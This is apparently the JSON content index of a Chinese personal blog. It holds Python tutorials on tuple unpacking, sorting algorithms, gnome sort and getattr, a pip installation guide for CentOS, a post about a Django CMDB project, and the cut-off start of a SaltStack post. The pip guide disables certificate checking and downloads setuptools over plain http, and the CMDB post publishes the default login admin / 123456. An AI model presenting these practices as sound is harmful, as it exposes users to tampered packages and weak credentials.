{"meta":{"title":"Vimiix","subtitle":"一个Python爱好者的个人网站","description":null,"author":"Vimiix","url":"http://blog.vimiix.com"},"pages":[{"title":"","date":"2017-05-15T09:30:13.529Z","updated":"2017-03-09T01:58:15.216Z","comments":true,"path":"baidu_verify_rjRD2cB7ME.html","permalink":"http://blog.vimiix.com/baidu_verify_rjRD2cB7ME.html","excerpt":"","text":"rjRD2cB7ME"},{"title":"","date":"2017-05-15T09:30:13.526Z","updated":"2017-04-19T02:56:51.406Z","comments":true,"path":"404.html","permalink":"http://blog.vimiix.com/404.html","excerpt":"","text":".align-center{ margin:0 auto; /* ���� �����Ǳ����ģ������������ԷǱ��� */ width:654px; } 404"},{"title":"About","date":"2017-08-02T10:22:56.123Z","updated":"2017-08-02T10:22:56.123Z","comments":true,"path":"about/index.html","permalink":"http://blog.vimiix.com/about/index.html","excerpt":"","text":"{Vimiix} 91年，山西人，现漂于北京。 参与过一些BLE蓝牙SDK的开发 熟悉C语言和Python开发，业余时间爱好逛github学习大神的代码。 平常涉猎广泛，IT方面知识不挑食。 现阶段主攻python web和数据抓取方向，同时在研究Python性能优化 目前状态：产品运营喵在朝python大军靠拢中… 职业规划：python工程师 -&gt; 高级 -&gt; 架构 -&gt; 深度学习 爱好：游泳/旅游 {联系方式} Twitter：_vimiix Github：vimiix 微博：vimiix Email：i@vimiix.com {编程信仰}Python之禅 by Tim Peters优美胜于丑陋（Python 以编写优美的代码为目标） 明了胜于晦涩（优美的代码应当是明了的，命名规范，风格相似） 简洁胜于复杂（优美的代码应当是简洁的，不要有复杂的内部实现） 复杂胜于凌乱（如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁） 扁平胜于嵌套（优美的代码应当是扁平的，不能有太多的嵌套） 间隔胜于紧凑（优美的代码有适当的间隔，不要奢望一行代码解决问题） 可读性很重要（优美的代码是可读的） 即便假借特例的实用性之名，也不可违背这些规则（这些规则至高无上） 不要包容所有错误，除非你确定需要这样做（精准地捕获异常，不写 except:pass 风格的代码） 当存在多种可能，不要尝试去猜测 而是尽量找一种，最好是唯一一种明显的解决方案（如果不确定，就用穷举法） 虽然这并不容易，因为你不是 Python 之父（这里的 Dutch 是指 Guido ） 做也许好过不做，但不假思索就动手还不如不做（动手之前要细思量） 如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然（方案测评标准） 命名空间是一种绝妙的理念，我们应当多加利用（倡导与号召） {关于站点} 个人博客站点。 采用 Hexo + Icarus 主题搭建 网站托管于github 静态资源使用七牛云存储加速 欢迎来访的朋友添加友链 :P"},{"title":"About","date":"2017-07-04T09:56:30.881Z","updated":"2017-07-04T09:56:30.881Z","comments":true,"path":"projects/index.html","permalink":"http://blog.vimiix.com/projects/index.html","excerpt":"","text":"{Vimiix} 91年，山西人，现漂于北京。 参与过一些BLE蓝牙SDK的开发 熟悉C语言和Python开发，业余时间爱好逛github学习大神的代码。 平常涉猎广泛，IT方面知识不挑食。 现阶段主攻python web和数据抓取方向，同时在研究Python性能优化 目前状态：产品运营喵在朝python大军靠拢中… 职业规划：python工程师 -&gt; 高级 -&gt; 架构 -&gt; 深度学习 爱好：游泳/旅游 {联系方式} Twitter：_vimiix Github：vimiix 微博：vimiix Email：i@vimiix.com {编程信仰}Python之禅 by Tim Peters优美胜于丑陋（Python 以编写优美的代码为目标） 明了胜于晦涩（优美的代码应当是明了的，命名规范，风格相似） 简洁胜于复杂（优美的代码应当是简洁的，不要有复杂的内部实现） 复杂胜于凌乱（如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁） 扁平胜于嵌套（优美的代码应当是扁平的，不能有太多的嵌套） 间隔胜于紧凑（优美的代码有适当的间隔，不要奢望一行代码解决问题） 可读性很重要（优美的代码是可读的） 即便假借特例的实用性之名，也不可违背这些规则（这些规则至高无上） 不要包容所有错误，除非你确定需要这样做（精准地捕获异常，不写 except:pass 风格的代码） 当存在多种可能，不要尝试去猜测 而是尽量找一种，最好是唯一一种明显的解决方案（如果不确定，就用穷举法） 虽然这并不容易，因为你不是 Python 之父（这里的 Dutch 是指 Guido ） 做也许好过不做，但不假思索就动手还不如不做（动手之前要细思量） 如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然（方案测评标准） 命名空间是一种绝妙的理念，我们应当多加利用（倡导与号召） {关于站点} 个人博客站点。 采用 Hexo + Icarus 主题搭建 网站托管于github 静态资源使用七牛云存储加速 本站未特别声明的文章均为原创，使用“署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)”规范"},{"title":"Categories","date":"2017-05-15T09:30:13.531Z","updated":"2017-03-07T11:08:27.865Z","comments":true,"path":"categories/index.html","permalink":"http://blog.vimiix.com/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2017-05-15T09:30:13.536Z","updated":"2017-03-07T11:08:27.866Z","comments":true,"path":"tags/index.html","permalink":"http://blog.vimiix.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux|CentOS系统yum安装pip及遇到的问题解决方法","slug":"Linux-pip-setup-and-solve-problems","date":"2017-08-27T06:16:25.000Z","updated":"2017-08-27T06:25:20.538Z","comments":true,"path":"2017/08/27/Linux-pip-setup-and-solve-problems.html","link":"","permalink":"http://blog.vimiix.com/2017/08/27/Linux-pip-setup-and-solve-problems.html","excerpt":"pip是一个以Python计算机程序语言写成的软件包管理系统，他可以安装和管理软件包，另外不少的软件包也可以在“Python软件包索引”（英语：Python Package Index，简称PyPI）中找到。","text":"pip是一个以Python计算机程序语言写成的软件包管理系统，他可以安装和管理软件包，另外不少的软件包也可以在“Python软件包索引”（英语：Python Package Index，简称PyPI）中找到。 常规的安装pip方法首先安装扩展源EPEL 1sudo yum -y install epel-release 然后再安装pip 1sudo yum -y install python-pip 手动下载编译安装pip一般上面的方法就可以安装成功了。今天我在新买的云主机上面也这样做，epel扩展源确认已经安装，但还是一直提示我python-pip这个模块找不到。这种情况，只能自己手动下载源文件编译安装了。 截至书写本文时间，pip的最新版本为9.0.1 1wget --no-check-certificate https://github.com/pypa/pip/archive/9.0.1.tar.gz 注意：wget获取https的时候需要加上：--no-check-certificate 下载下来以后，解压安装 123tar zvxf 9.0.1.tar.gzcd pip-9.0.1/python setup.py install 缺少setiptools模块此时在安装pip的过程执行python setup.py install时报错，提示：ImportError No module named setuptools字面意思就是本地缺少setuptools这个模块。 解决方法1234wget http://pypi.python.org/packages/source/s/setuptools/setuptools-0.6c11.tar.gztar zxvf setuptools-0.6c11.tar.gzcd setuptools-0.6c11python setup.py install setuptools安装成功以后，再返回去pip的解压目录执行python setup.py install，此时没有报错，且安装成功。 pip升级pip安装成功以后，我喜欢把软件都更新到最新版，更新pip执行 1pip install --upgrade pip 至此，pip就安装完整的安装成功了。 参考资料 pip（软件包管理系统）-维基百科) pip 安装使用 ImportError: No module named setuptools 解决方法 包子博客","categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.vimiix.com/categories/Linux/"}],"tags":[{"name":"CentOS","slug":"CentOS","permalink":"http://blog.vimiix.com/tags/CentOS/"},{"name":"python","slug":"python","permalink":"http://blog.vimiix.com/tags/python/"},{"name":"pip","slug":"pip","permalink":"http://blog.vimiix.com/tags/pip/"}]},{"title":"Python|元组拆包和具名元组解析","slug":"Python-tuple-unpacking","date":"2017-08-05T09:02:29.000Z","updated":"2017-08-05T10:36:50.650Z","comments":true,"path":"2017/08/05/Python-tuple-unpacking.html","link":"","permalink":"http://blog.vimiix.com/2017/08/05/Python-tuple-unpacking.html","excerpt":"前言在Python中元组是一个相较于其他语言比较特别的一个内置序列类型。有些python入门教程把元组成为“不可变的列表”，这种说法是不完备的，其并没有完整的概括元组的特点。除了用作不可变的列表，它还可以用于没有字段名的数据记录。下面的内容就围绕元组作为数据记录属性展开，并介绍带字段名的具名元组函数namedtuple，列表属性不再本文中叙述。","text":"前言在Python中元组是一个相较于其他语言比较特别的一个内置序列类型。有些python入门教程把元组成为“不可变的列表”，这种说法是不完备的，其并没有完整的概括元组的特点。除了用作不可变的列表，它还可以用于没有字段名的数据记录。下面的内容就围绕元组作为数据记录属性展开，并介绍带字段名的具名元组函数namedtuple，列表属性不再本文中叙述。 元组对于数据的记录元组中的每个元素都存放了记录中一个字段的数据，外加这个字段的位置，正是这个位置信息给数据赋予了意义。 下面的一段代码就演示了元组被当作记录来使用。如果在任何的表达式里我们在元组内对元素排序，这些元素多携带的信息就会丢失，因为这些信息是跟它们的位置强关联的。 123456789101112#把元组作记录&gt;&gt;&gt; xiaoming, xiaohua = (16, 18)&gt;&gt;&gt; xiaoming16&gt;&gt;&gt; students_info = [('xiaoming', 16), ('xiaohua', 18), ('hanmeimei', 20)]&gt;&gt;&gt; for student in students_info: print('%s is %d years old.'%student)xiaoming is 16 years old.xiaohua is 18 years old.hanmeimei is 20 years old.&gt;&gt;&gt; 在这个示例中，我们把元组（16，18）里的元素分别赋值给变量xiaoming,xiaohua。同样在for循环中，一个%运算符就把student元组里的元素对应到了Print函数的格式字符串空档中。这两个都是元组拆包的应用。 元组拆包可以应用到任何可迭代对象上，唯一的硬性要求是，被可迭代对象中的元素数量必须要跟接受这些元素的元组的空档数一致。除非用*来表示忽略多余的元素。 元组拆包最好辨认的元组拆包形式就是平行赋值 ，也就是把一个可迭代对象里的元素，一并赋值到由对应的变量组成的元组中。例如： 12&gt;&gt;&gt; age_list = (16,18)&gt;&gt;&gt; xiaoming, xiaohua = age_list #这里就是元组拆包 另一个我们熟悉的平行赋值的例子就是交换两个变量的值： 1&gt;&gt;&gt; a, b = b, a #Python就是如此的优雅 还可以用*运算符把一个可迭代对象拆开作为函数的参数： 12345678&gt;&gt;&gt; divmod(20,8)(2, 4)&gt;&gt;&gt; t = (20, 8)&gt;&gt;&gt; divmod(*t)(2, 4)&gt;&gt;&gt; quotient, remainder = divmod(*t)&gt;&gt;&gt; quotient, remainder(2, 4) 用*来处理剩下的元素在Python中，函数用*args来获取不确定数量的参数算是一种经典写法了。在Python3中，这个概念被扩展到了平行赋值中： 123456789&gt;&gt;&gt; a, b, *rest = range(5)&gt;&gt;&gt; a, b, rest(0, 1, [2, 3, 4])&gt;&gt;&gt; a, b, *rest = range(3)&gt;&gt;&gt; a, b, rest(0, 1, [2])&gt;&gt;&gt; a, b, *rest = range(2)&gt;&gt;&gt; a, b, rest(0, 1, []) 在平行赋值中，*运算符前缀智能用在一个变量名前面，但是这个变量可以出现在赋值表达式的任意位置： 123456&gt;&gt;&gt; a, *others, b, c = range(5)&gt;&gt;&gt; a, others, b, c(0, [1, 2], 3, 4)&gt;&gt;&gt; *others, a, b, c = range(5)&gt;&gt;&gt; others, a, b, c([0, 1], 2, 3, 4) 具名元组在Python中，collections.namedtuple是一个工厂函数，它可以用来构建一个带字段名的元组和一个有名字的类。 用namedtuple构建的类的实例所消耗的内存跟元组是一样的，因为字段名都被存在对应的类里面。这个实例跟普通的对象实例比起来也要小一些，因为python不会用__dict__来存放这些实例的属性。 还是使用上面的小明和小华的例子来展示一下具名元组： 123456789&gt;&gt;&gt; from collections import namedtuple&gt;&gt;&gt; Student = namedtuple('Student', 'name age gender')&gt;&gt;&gt; xiaoming = Student('xiaoming', 16, 'boy')&gt;&gt;&gt; xiaomingStudent(name='xiaoming', age=16, gender='boy')&gt;&gt;&gt; xiaoming.age16&gt;&gt;&gt; xiaoming[2]'boy' Student = namedtuple(&#39;Student&#39;, &#39;name age gender&#39;)，创建一个具名元组，需要两个参数，一个是类名，另一个是类的各个字段名。后者可以是有多个字符串组成的可迭代对象，或者是有空格分隔开的字段名组成的字符串（比如本示例）。具名元组可以通过字段名或者位置来获取一个字段的信息。 具名元组的特有属性 类属性_fields：包含这个类所有字段名的元组 12&gt;&gt;&gt; xiaoming._fields('name', 'age', 'gender') 类方法_make(iterable)：接受一个可迭代对象来生产这个类的实例，作用等价于Student(*xiaohua_info) 1234&gt;&gt;&gt; xiaohua_info = ('xiaohua', 18, 'girl')&gt;&gt;&gt; xiaohua = Student._make(xiaohua_info)&gt;&gt;&gt; xiaohuaStudent(name='xiaohua', age=18, gender='girl') 实例方法_asdict()：把具名元组以collections.OrdereDict的形式返回，可以利用它来把元组里的信息友好的展示出来 12345678&gt;&gt;&gt; xiaohua._asdict()OrderedDict([('name', 'xiaohua'), ('age', 18), ('gender', 'girl')])&gt;&gt;&gt; for key, value in xiaohua._asdict().items(): print(key,':',value) name : xiaohuaage : 18gender : girl","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"tuple","slug":"tuple","permalink":"http://blog.vimiix.com/tags/tuple/"},{"name":"namedtuple","slug":"namedtuple","permalink":"http://blog.vimiix.com/tags/namedtuple/"}]},{"title":"算法日记|用递归和迭代的思想分别实现插入排序和选择排序","slug":"algorithms-insert-sort-and-select-sort","date":"2017-08-02T09:17:25.000Z","updated":"2017-08-02T10:18:06.567Z","comments":true,"path":"2017/08/02/algorithms-insert-sort-and-select-sort.html","link":"","permalink":"http://blog.vimiix.com/2017/08/02/algorithms-insert-sort-and-select-sort.html","excerpt":"思路 插入排序（insert sort） 先归纳性的假设前n-1个元素已经完成排序了，现在要将第n个元素向前插入到正确的位置上。这种方式称之为插入排序法 选择排序（selection sort） 先找到整个序列中最大的元素，并将其向后放在n（待排序的序列末尾）的位置上，然后继续递归排序剩下的元素。这种方式称之为选择排序法","text":"思路 插入排序（insert sort） 先归纳性的假设前n-1个元素已经完成排序了，现在要将第n个元素向前插入到正确的位置上。这种方式称之为插入排序法 选择排序（selection sort） 先找到整个序列中最大的元素，并将其向后放在n（待排序的序列末尾）的位置上，然后继续递归排序剩下的元素。这种方式称之为选择排序法 Python代码实现 递归版插入排序123456789def ins_sort_rec(seq, i): if i == 0: #单元素情况，直接返回 return ins_sort_rec(seq, i-1) #递归排序0~(i-1)的元素，排好后，后面会将i的元素向前插入 j = i while j &gt; 0 and seq[j-1] &gt; seq[j]: #寻找合适的位置，直到找到比seq[j]小的元素时，停止循环 seq[j-1], seq[j] = seq[j], seq[j-1] #交换位置 j -= 1 #递减索引值 这段代码概括了该算法的思路：如果想要对目标序列中的第i个元素进行排序，首先要对i-1个元素进行递归性排序，并通过交换方式将seq[i]放到其已排序元素中的正确位置上，。尽管这种实现形式可以让我们在递归调用中很好的概括其归纳前提，但在具体实践中会受到限制（例如：它只能在一定的序列长度下正常工作）。 迭代版插入排序1234567def ins_sort(seq): for i in range(1,len(seq)): #从0到(i-1)排序 j = i #j作为扫描索引从后向前扫描，i为每一次的要插入的序列长度 while j &gt; 0 and seq[j-1] &gt; seq[j]: #寻找合适位置 seq[j-1], seq[j] = seq[j], seq[j-1] #依次交换位置 j -= 1 #递减索引值扫描 上面这段代码所展示的则是更为人们所熟知的迭代版插入排序。它将原先的后退式递归调用改成了从第一个元素开始的前进式迭代操作。但仔细推敲一下，就会发现递归也是这样做的。尽管看起来递归似乎是从序列尾端开始的，但是while循环被执行之前，这些递归调用得要先完全回退到第一个元素上。然后在该递归调用开始返回之后，while循环才能开始处理第二个元素，并以此类推下去。所以，以上两个版本的行为其实是相同的。 递归版选择排序12345678910def sel_sort_rec(seq, i): if i == 0: #单元素直接返回 return max_j = i #初始化一个max_j作为要找的最大元素的索引值，先假设目前序列的最后一个为最大值 for j in range(i): #寻找最大元素 if seq[j] &gt; seq[max_j]: max_j = j #找到一个比seq[i]大的就更新max_j的值 seq[i], seq[max_j] = seq[max_j], seq[i] #将最大的元素放到末尾 sel_sort_rec(seq, i-1) #继续排列前i-1个元素 迭代版选择排序12345678def sel_sort(seq): for i in range(len(seq)-1, 0, -1): #从最长开始依次递减将最大元素放在末尾 max_j = i #初始化max_j的索引值 for j in range(i): #寻找最大值 if seq[j] &gt; seq[max_j]: max_j = j #更新最大元素的索引值 seq[i], seq[max_j] = seq[max_j], seq[i] #奖最大元素后放 这两段代码和上面一样，递归版实现明确表示了其归纳前提，而迭代版则明确说明了其反复迭代执行的归纳步骤。两者都是先找出最大元素，并将其交换到当前所关注序列的尾端。","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.vimiix.com/categories/算法/"}],"tags":[{"name":"python","slug":"python","permalink":"http://blog.vimiix.com/tags/python/"},{"name":"algorithms","slug":"algorithms","permalink":"http://blog.vimiix.com/tags/algorithms/"},{"name":"算法日记","slug":"算法日记","permalink":"http://blog.vimiix.com/tags/算法日记/"}]},{"title":"算法日记|使用L形砖拼接国际象棋棋盘","slug":"algorithms-cover-board-game","date":"2017-08-01T11:54:21.000Z","updated":"2017-08-01T13:02:39.764Z","comments":true,"path":"2017/08/01/algorithms-cover-board-game.html","link":"","permalink":"http://blog.vimiix.com/2017/08/01/algorithms-cover-board-game.html","excerpt":"递归解决棋盘拼接问题题目介绍如图所示，图中有一块角上缺了一个方格的国际象棋棋盘，现在我们想用L形砖拼接出这样一块棋盘。","text":"递归解决棋盘拼接问题题目介绍如图所示，图中有一块角上缺了一个方格的国际象棋棋盘，现在我们想用L形砖拼接出这样一块棋盘。 Python代码123456789101112131415161718192021def cover(board, lab=1, top=0, left=0, side=None): if side is None: side = len(board) s = side // 2 offsets = (0, -1), (side-1, 0) for dy_outer, dy_inner in offsets: for dx_outer, dx_inner in offsets: if not board[top+dy_outer][left+dx_outer]: board[top+s+dy_inner][left+s+dx_inner] = lablab += 1if s &gt; 1: for dy in [0, s]: for dx in [0, s]: lab = cover(board, lab, top+dy, left+dx, s)return lab 运行一下代码 1234567891011121314151617&gt;&gt;&gt; board = [[0]*8 for i in range(8)]&gt;&gt;&gt; board[0][7] = -1&gt;&gt;&gt; cover(board)22&gt;&gt;&gt; for row in board:... print((\" %2i\"*8)%tuple(row)) 3 3 4 4 8 8 9 -1 3 2 2 4 8 7 9 9 5 2 6 6 10 7 7 11 5 5 6 1 10 10 11 11 13 13 14 1 1 18 19 19 13 12 14 14 18 18 17 19 15 12 12 16 20 17 17 21 15 15 16 16 20 20 21 21 如上，上面所有的数字标签都排成了L形。（-1除外，那是缺角所在的位置）。这段代码的实现过程基于算法上的归纳法基础和递归的思想。具体解释请参考挪威Python程序大拿Magnus Lie Hetland写的《Python算法教程》一书第三章和第六章的知识。","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.vimiix.com/categories/算法/"}],"tags":[{"name":"python","slug":"python","permalink":"http://blog.vimiix.com/tags/python/"},{"name":"algorithms","slug":"algorithms","permalink":"http://blog.vimiix.com/tags/algorithms/"},{"name":"算法日记","slug":"算法日记","permalink":"http://blog.vimiix.com/tags/算法日记/"}]},{"title":"算法日记|侏儒排序算法实现和复杂度分析","slug":"algorithms-gnomesort","date":"2017-07-31T07:58:21.000Z","updated":"2017-08-01T13:02:54.983Z","comments":true,"path":"2017/07/31/algorithms-gnomesort.html","link":"","permalink":"http://blog.vimiix.com/2017/07/31/algorithms-gnomesort.html","excerpt":"侏儒排序介绍侏儒排序是由Hamid Sarbazi-Azad在2000年提出的，也叫愚人排序法（Stupid sort）。这种排序算法一种简单的复杂度为平方级的排序算法，一般实际生产中不会用到。","text":"侏儒排序介绍侏儒排序是由Hamid Sarbazi-Azad在2000年提出的，也叫愚人排序法（Stupid sort）。这种排序算法一种简单的复杂度为平方级的排序算法，一般实际生产中不会用到。 Python代码123456789def gnomesort(seq): i = 0 while i &lt; len(seq): if i==0 or seq[i-1]&lt;=seq[i]: i += 1 else: seq[i], seq[i-1] = seq[i-1], seq[i] i -= 1 return seq 说明侏儒排序法中只有一个简单的while循环和额一个索引范围为0到len(seq)-1的索引变量。这和容易让人以为它是一个线性时间的算法，但这个结论被最后一行中的i -= 1语句给否定了。要想搞清楚该算法究竟运行了多长时间，我们必须搞懂他工作过程中的一些细节。 起初，我们会从左边开始扫描（持续递增i），直到找到一个seq[i-1]大于seq[i]的位置i,这时两个值顺序就错了，于是else部分开始生效。 else分支会持续交换seq[i]与seq[i-1]的值并递减i，直到其再次恢复到之前seq[i-1] &lt;= seq[i]的顺序。换句话说，该算法会沿着目标序列交叉向上扫描来发现错了位的元素，并将其经过反复交换下移到合适的位置。那么其整体开销是多少呢？先忽略到平均情况，只关注最好和最坏的情况。 最好的情况当然是目标序列已经排好序，这时gnomesort只需要将整个序列扫描一遍即可便停止，其运行时间为Ω(n)。 而最坏的情况就没有那么简单了，但也没有多复杂。需要注意的是，通常每当我们发现一个元素错位时，这之前的所有元素都应该是已经排好序了。所以，当我们将新元素移动到合适的位置的时候是不会发生冲突的。也就是说，每纠正一个错位元素，已排序元素的数量就会有所增加，并且下一个错位的元素会出现在更后面的位置上，所以可能的最坏的情况就是查找并移动这些错位的元素的开销与其位置形成了正比关系。因而最糟糕的运行时间就应该是1+2+3+...+(n-1)，也就是O(n^2) 所以，Ω(n)和O(n^2)就表示了侏儒算法的最好和最坏情况的上下严格边界。","categories":[{"name":"算法","slug":"算法","permalink":"http://blog.vimiix.com/categories/算法/"}],"tags":[{"name":"python","slug":"python","permalink":"http://blog.vimiix.com/tags/python/"},{"name":"algorithms","slug":"algorithms","permalink":"http://blog.vimiix.com/tags/algorithms/"},{"name":"算法日记","slug":"算法日记","permalink":"http://blog.vimiix.com/tags/算法日记/"}]},{"title":"vmx-manager--基于django框架开发的cmdb系统","slug":"vmx-manager-A-cmdb-system-base-on-django","date":"2017-07-18T14:58:21.000Z","updated":"2017-07-18T15:21:14.861Z","comments":true,"path":"2017/07/18/vmx-manager-A-cmdb-system-base-on-django.html","link":"","permalink":"http://blog.vimiix.com/2017/07/18/vmx-manager-A-cmdb-system-base-on-django.html","excerpt":"系统介绍VMX-Manager是一个基于Django框架开发的一款CMDB管理系统，目前处于beta版本，功能主要包含: 管理系统管理的客户主机列表， 动态显示客户机状态信息，远程指令操作指定客户机以及主机与客户机之间的文件传输。","text":"系统介绍VMX-Manager是一个基于Django框架开发的一款CMDB管理系统，目前处于beta版本，功能主要包含: 管理系统管理的客户主机列表， 动态显示客户机状态信息，远程指令操作指定客户机以及主机与客户机之间的文件传输。 注：VMX取自作者昵称Vimiix缩写功能描述： 云主机的信息统计 数据的动态展示 远程指令控制 文件传输 开发环境 win10 python2.7 Django1.11.1 paramiko2.2.1 Sqlite3 整体架构 使用说明及展示注：本次使用说明基于在本地IP端口，直接访问http://127.0.0.1:8000即可开启系统第一种方法： 命令行切换到项目的根目录（/vmx_manager）下,执行命令python manager.py runserver 0.0.0.0:8000 ，这里让系统启动并设置IP为0.0.0.0目的是可以让客户端主机访问。 第二种方法： 直接将本项目导入pycharm,运行启动项目即可。 管理员注册新人访问系统，需首先注册一个管理员账号，注册地址:http://127.0.0.1:8000/manager/register/ 登录注册成功以后，会自动跳转至登录页面，用刚才注册的账号登录即可。 若不想注册，直接使用此账号登陆： 账号：admin 密码：123456 进入首页，可以看到本系统的基本介绍和功能选择界面 自登录进来以后，会自动保存管理员信息在本地cookie中，有效期是1小时，也就是说1小时以后，系统会要求管理员重新登录，否则自动退出。 下面就依次介绍每个功能 主机列表在这个页面，展示了目前已经在管理的客户主机信息,其中包含主机的IP，自定义名称，操作系统，CPU型号，以及最近的一次重启时间。 在这个页面，管理员可以直接操作删除目前管理的客户主机，将不再对其监控。也可以添加一个新的主机进来，点击新增按钮，跳转至添加页面，将要添加的主机IP，可以管理员信息填写进去，系统会自动去读取要管理的主机相关信息，并保存到数据库，添加成功弹窗提示，点击确定返回到主机列表，此时会看到新添加成功的主机。 动态信息这个页面作了一个信息动态的展示，因为要想显示更多的信息，只是在脚本中，去多读取一些信息，发送回来，分图表去展示，这里目前只收集到一个客户机发送上来的CPU信息用来做例子展示。 这个页面想要看到数据的动态变化，需要讲本项目根目录下的sendData.py文件打开，配置好服务器的IP(比如我win10的IP是192.168.1.109)，并使用一会儿要说到的第四个文件分发功能将这个文件，下发到客户机上去运行起来。这样就会在这个页面看到对应客户主机的动态信息。 远程指令在这个页面有两个功能： 给指定远程主机发生指令，并获取执行结果 查看最近执行成功的8条指令 发送指令下面的例子中，我向我的AWS云主机发送了一条指令ls /home/ec2-user，查看我的用户目录下的文件信息,右边的黑色框中回显了收到的信息。若链接主机失败，会在右侧的显示框，提示链接不成功。 发送指令历史点击发送历史按钮，会在右侧框中显示历史纪录，格式为：发送时间&gt;&gt;发送指令&gt;&gt;远程主机IP 文件传输这个页面同样也是有两个功能：： 向服务器上传文件 向指定IP的远程主机，分发文件 成功则在本页面提示发送成功，失败提示发送失败 具体使用请参考下面的图片： 上传文件上传成功以后，会保存在项目根目录下的upload中。 分发文件 我们到192.168.59.129这个IP的主机中去看一下，文件是否发送成功？ 从上图可以看出，主机IP192.168.59.129成功接收到了我们刚刚从win10发送的requirements.txt的文件。 写在最后这个系统不能算成熟的产品，因为其中很多功能其实可以用更好的方式去优化实现。但是，这是一次很有收获的经历。在写专注的写代码的三天中，从前端到后端到数据库，遇到了不计其数的坑，但都通过自己不断的google,思考，优化，一步一步的都解决了。希望自己一如既往的保持一颗求知的心，去不断的探索新的知识，大胆的尝试，勇敢的试错，跨过去一道坎的心情是难以在黎明前去阐述的，小小感慨，聊以自勉。 EndSee project at https://github.com/vimiix/vmx_manager","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://blog.vimiix.com/tags/python/"},{"name":"django","slug":"django","permalink":"http://blog.vimiix.com/tags/django/"},{"name":"cmdb","slug":"cmdb","permalink":"http://blog.vimiix.com/tags/cmdb/"}]},{"title":"[Python]内建函数getattr()函数详解","slug":"Python-Introduce-getattr-function","date":"2017-07-10T04:08:03.000Z","updated":"2017-07-10T04:57:24.652Z","comments":true,"path":"2017/07/10/Python-Introduce-getattr-function.html","link":"","permalink":"http://blog.vimiix.com/2017/07/10/Python-Introduce-getattr-function.html","excerpt":"前言昨天在Hackerrank上面练习Python题目的时候，题目要求从终端输入命令和参数，然后脚本获取到以后执行相应的操作（查看原题），作为初级程序员，我第一思路想到的解法就是枚举（因为题目上面限制了就3条命令）。通过if ... elif...elif...的分支语句就解决了。Hackerrank有一个好处就是，每一个题目都有一个讨论区，在讨论区中往往会有超出本人能力范围的巧妙高级解法发表在里面。有个大牛在讨论区发表了自己的解法，其中就用到了getattr这个内建函数，这样代码的扩展性就极强了，不再局限于本题目的三条指令。下面就记录一下这个有趣的函数。 上述代码查看传送门","text":"前言昨天在Hackerrank上面练习Python题目的时候，题目要求从终端输入命令和参数，然后脚本获取到以后执行相应的操作（查看原题），作为初级程序员，我第一思路想到的解法就是枚举（因为题目上面限制了就3条命令）。通过if ... elif...elif...的分支语句就解决了。Hackerrank有一个好处就是，每一个题目都有一个讨论区，在讨论区中往往会有超出本人能力范围的巧妙高级解法发表在里面。有个大牛在讨论区发表了自己的解法，其中就用到了getattr这个内建函数，这样代码的扩展性就极强了，不再局限于本题目的三条指令。下面就记录一下这个有趣的函数。 上述代码查看传送门 记录getattr是python里的一个内建函数,先看定义 1234567891011&gt;&gt;&gt; help(getattr)Help on built-in function getattr in module __builtin__:getattr(...) getattr(object, name[, default]) -&gt; value Get a named attribute from an object; getattr(x, 'y') is equivalent to x.y. When a default argument is given, it is returned when the attribute doesn't exist; without it, an exception is raised in that case.&gt;&gt;&gt; getattr()的三个参数： object : 要实例化的对象 name ： 要执行的命令操作 default :（可省略参数）当要执行的命令操作不存在是，会返回这里传入的default getattr()主要的作用是通过传入字符串的方式，来动态的获取方法的实例。这个函数最大的用处在于函数解耦，可以讲一些可能会调用的方法，写到一个配置文件中，在需要的时候动态加载。 解释的比较抽象，简单来说：getattr(object, name) 等价于 object.name 下面通过代码说明一下 123for i in range(t): c, *args = map(str,input().split()) getattr(s,c) (*(int(x) for x in args)) 这段代码实现了用户从stdin输入命令和参数，命令赋值给了c，参数传给了一个指针变量*args,这里使用*args是为了接收不确定个数的参数。然后调用getattr(s,c)来执行c这条指令（注：s是一串字符串），此处getattr(s,c)就可以等价于s.c,后面括号内(*(int(x) for x in args)),这里是一个生成器表达式，这部分称为参数解包，它类似于如何定义具有任意数量（位置）参数的函数 — *在序列之前将遍历序列并将其成员变为函数调用参数。 可以看出，这样的用法比枚举的思路方便了很多，也具有更高的扩展性。 延伸Python中和getattr相关的还有hasattr、setattr、delattr，通过举例了解一下。 1234567891011#定义一个类对象class Vimiix: def __init__(self): self.name = 'vimiix' def setName(self, name): self.name = name def getName(self): return self.name#实例化对象foo = Vimiix() hasattr(object, name) 判断object是否具有name属性123&gt;&gt;&gt;hasattr(foo,'getName')True setattr(object,name,default) 设置一个新的属性，并赋予值.类似foo.age = 181&gt;&gt;&gt;setattr(foo, 'age', '18') delattr(object, name) 删除object对象的name属性1234&gt;&gt;&gt;delattr(foo, 'age')&gt;&gt;&gt;getattr(foo, 'age', 'Not find')'Not find'","categories":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.vimiix.com/tags/Python/"},{"name":"getattr","slug":"getattr","permalink":"http://blog.vimiix.com/tags/getattr/"}]},{"title":"DevOps|SaltStack的部署和基本指令","slug":"SaltStack-Note-1-setup-and-simple-cmds","date":"2017-06-27T12:08:03.000Z","updated":"2017-08-27T06:19:43.280Z","comments":true,"path":"2017/06/27/SaltStack-Note-1-setup-and-simple-cmds.html","link":"","permalink":"http://blog.vimiix.com/2017/06/27/SaltStack-Note-1-setup-and-simple-cmds.html","excerpt":"SaltStack是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，。SaltStack基于Python语言实现，结合轻量级消息队列（ZeroMQ）与python第三方模块（Pyzmq、PyCrypto、Pyjinjia2、python-msgpack和PyYAML等）构建。","text":"SaltStack是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能，。SaltStack基于Python语言实现，结合轻量级消息队列（ZeroMQ）与python第三方模块（Pyzmq、PyCrypto、P